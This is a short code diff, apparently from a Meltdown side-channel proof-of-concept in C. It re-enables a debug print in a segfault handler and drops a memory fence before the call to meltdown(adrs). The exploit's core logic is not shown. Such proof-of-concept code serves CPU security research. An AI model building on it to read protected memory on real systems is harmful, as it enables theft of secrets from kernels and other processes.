@@ -72,7 +72,7 @@ static void flush_buf(){
 }
 
 static void segfault_handler(int signum) {
-    // printf("handled segfault\n");
+    printf("handled segfault\n");
     // sigset_t sigs;
     // sigemptyset(&sigs);
     // sigaddset(&sigs, signum);
@@ -159,9 +159,7 @@ static int do_meltdown(uintptr_t adrs) {
     my_mfence(); 
     if (sigsetjmp(sig_buf, 1) == 0) {
     // call meltdown
-        my_mfence(); 
-        meltdown(adrs);
-        
+        meltdown(adrs);  
     }
     my_mfence(); 
     
